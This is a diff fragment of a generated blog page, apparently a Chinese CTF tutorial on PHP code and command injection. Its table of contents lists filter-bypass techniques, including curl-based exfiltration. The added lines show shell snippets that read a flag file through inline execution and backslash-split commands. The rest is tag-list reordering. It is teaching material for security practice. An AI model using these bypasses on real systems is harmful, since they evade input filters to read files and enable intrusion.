+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">echo</span> &quot;<span class="selector-tag">more</span> `<span class="selector-tag">cat</span> <span class="selector-tag">flag</span>`&quot;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">echo</span> &quot;<span class="selector-tag">more</span> $(cat flag)&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ca</span>\</span><br><span class="line"><span class="selector-tag">t</span>\</span><br><span class="line"><span class="selector-tag">fl</span>\</span><br><span class="line"><span class="selector-tag">ag</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/17.png"></p>
+
 	
 
 
@@ -599,7 +700,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常见函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#system"><span class="toc-number">1.1.</span> <span class="toc-text">system</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec"><span class="toc-number">1.2.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#passthru"><span class="toc-number">1.3.</span> <span class="toc-text">passthru</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell-exec"><span class="toc-number">1.4.</span> <span class="toc-text">shell_exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number">1.5.</span> <span class="toc-text">反引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#popen"><span class="toc-number">1.6.</span> <span class="toc-text">popen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-open"><span class="toc-number">1.7.</span> <span class="toc-text">proc_open</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">1.8.</span> <span class="toc-text">pcntl_exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">LD_PRELOAD绕过</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">相关函数漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">代码注入相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#eval-%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">eval()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#assert-%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">assert()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#call-user-func"><span class="toc-number">2.1.3.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">2.1.4.</span> <span class="toc-text">call_user_func_array()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#create-function"><span class="toc-number">2.1.5.</span> <span class="toc-text">create_function()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#array-map"><span class="toc-number">2.1.6.</span> <span class="toc-text">array_map()</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BD%A2%E5%BC%8F%E4%B8%80"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">形式一</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BD%A2%E5%BC%8F%E4%BA%8C"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">形式二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">命令注入相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#system"><span class="toc-number">2.2.1.</span> <span class="toc-text">system()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exec"><span class="toc-number">2.2.2.</span> <span class="toc-text">exec()</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%E2%80%93bp%E6%B5%81%E9%87%8F%E7%9B%91%E5%90%AC"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">方法一–bp流量监听</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E2%80%93%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">方法二–重定向到文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%E2%80%93curl%E5%A4%96%E5%B8%A6"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">方法三–curl外带</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#passthru"><span class="toc-number">2.2.3.</span> <span class="toc-text">passthru()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shell-exec"><span class="toc-number">2.2.4.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">2.2.5.</span> <span class="toc-text">&#96;&#96;运算符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">几种常见的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system-%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">system()绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cat%E6%88%96%E8%80%85flag%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">cat或者flag绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.1.</span> <span class="toc-text">变量拼接绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E6%88%96%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.2.</span> <span class="toc-text">单引号或双引号绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87%EF%BC%88cat%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-number">3.3.3.</span> <span class="toc-text">读文件绕过（cat过滤）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E7%BA%BF"><span class="toc-number">3.3.4.</span> <span class="toc-text">反斜线</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87%E2%80%93%E2%80%9D-%E2%80%9D%E6%88%96%E2%80%9D-%E2%80%9D"><span class="toc-number">3.4.</span> <span class="toc-text">通配符绕过–”?”或”*”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">3.5.</span> <span class="toc-text">内敛执行绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C"><span class="toc-number">3.6.</span> <span class="toc-text">命令换行</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -756,19 +857,19 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">--VulnHub靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+                <a href="javascript:void(0)" class="js-tag color2">--VulnHub靶场</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -788,11 +889,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+                <a href="javascript:void(0)" class="js-tag color4">pwn</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">pwn</a>
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -804,19 +905,19 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">--红日靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
             
             <div class="clearfix"></div>
